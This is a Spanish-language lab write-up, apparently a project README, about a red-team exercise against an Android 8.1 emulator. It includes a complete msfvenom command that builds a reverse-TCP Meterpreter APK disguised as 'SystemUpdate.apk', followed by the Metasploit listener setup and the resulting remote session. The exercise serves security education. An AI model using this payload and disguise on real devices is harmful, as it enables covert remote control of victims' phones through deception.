# 📱 Análisis de Seguridad en Android & Simulación de Adversarios

## 🛡️ Descripción del Proyecto
Este laboratorio simula un escenario de **Red Team** y **Pentesting Móvil** para analizar la evolución de la seguridad en Android. El objetivo es comparar cómo las vulnerabilidades críticas en versiones antiguas (Android 8.1) han sido mitigadas en versiones modernas (Android 12+), y demostrar el riesgo de utilizar dispositivos desactualizados.

---

## 🏗️ Fase 1: Configuración del Entorno (Lab Setup)

Para realizar las pruebas de concepto (PoC) de manera segura, se ha configurado un entorno virtualizado aislado utilizando **Android Studio**.

### 1. Creación del Dispositivo Virtual (AVD)
Se utilizó el **Device Manager** de Android Studio para definir un nuevo objetivo.

![Crear Dispositivo](img/setup_1_creacion.png)

### 2. Selección de Hardware
Se eligió un perfil de **Pixel 2**. Este dispositivo es ideal para pruebas de seguridad estándar debido a su compatibilidad y especificaciones representativas de un dispositivo de gama media-alta de su época.

![Hardware Pixel 2](img/setup_2_hardware.png)

### 3. Selección del Sistema Operativo (Punto Crítico)
Esta es la decisión más importante del laboratorio. Se seleccionó explícitamente **Android 8.1 (Oreo) - API 27**.

* **¿Por qué API 27?**: Esta versión carece de las protecciones modernas de privacidad (como los indicadores visuales de cámara/micrófono o el bloqueo estricto de actividades en segundo plano) introducidas en Android 12 (API 31). Esto permite demostrar ataques de post-explotación con Metasploit que serían bloqueados en sistemas actuales.

![Selección de API 27](img/setup_3_sistema_operativo.png)

### 4. Despliegue del Objetivo
El dispositivo virtual se ejecuta exitosamente, simulando un teléfono funcional conectado a la red virtual del laboratorio, listo para recibir la auditoría.

![Dispositivo Corriendo](img/setup_4_ejecucion.png)

---

## ⚔️ Fase 2: Weaponization (Preparación del Ataque)

Con el entorno objetivo listo, pasamos a la máquina atacante (Kali Linux) para preparar la infraestructura.

### 1. Verificación de Red
Antes de iniciar, verificamos nuestra dirección IP local para configurar correctamente la conexión inversa (Reverse Shell).
![Configuración de Red](img/ataque_1_config_red.png)

### 2. Generación del Payload (Ingeniería Social)
Utilizamos `msfvenom` para generar el APK malicioso.
* **Comando:** `msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.31 LPORT=4444 R > SystemUpdate.apk`
* **Estrategia:** Se nombró el archivo como `SystemUpdate.apk` para engañar al usuario.

![Generando Payload](img/ataque_2_creacion_payload.png)

### 3. Verificación del Artefacto
Confirmamos en las propiedades del archivo que el payload se ha generado correctamente, verificando su nombre y tamaño antes de enviarlo.
![Propiedades del Malware](img/ataque_2_propiedades.png)

## 💀 Fase 3: Explotación y Acceso (Proof of Concept)

En esta fase ejecutamos el ataque completo, pasando de la escucha pasiva a la obtención de control remoto.

### 1. Despliegue del Listener (C2)
Iniciamos el controlador en Metasploit (`multi/handler`) configurado con el mismo payload (`android/meterpreter/reverse_tcp`) y puerto que el archivo malicioso. La terminal queda a la espera de conexiones entrantes.

![Listener Activo](img/ataque_3_listener.png)

### 2. Ejecución y Compromiso (Demo)
El siguiente video documenta la secuencia de éxito:
1.  El usuario ejecuta la aplicación `SystemUpdate` en el dispositivo Android 8.1.
2.  El sistema no solicita permisos especiales ni bloquea la conexión de red.
3.  Obtenemos una sesión de **Meterpreter** instantánea en nuestra máquina atacante.

![Demo del Ataque](img/ataque_demo.gif)

### Resultado Técnico
El ataque es exitoso. La sesión de Meterpreter (Session 1 opened) nos confirma que tenemos un canal de comunicación directo y persistente con el dispositivo víctima.

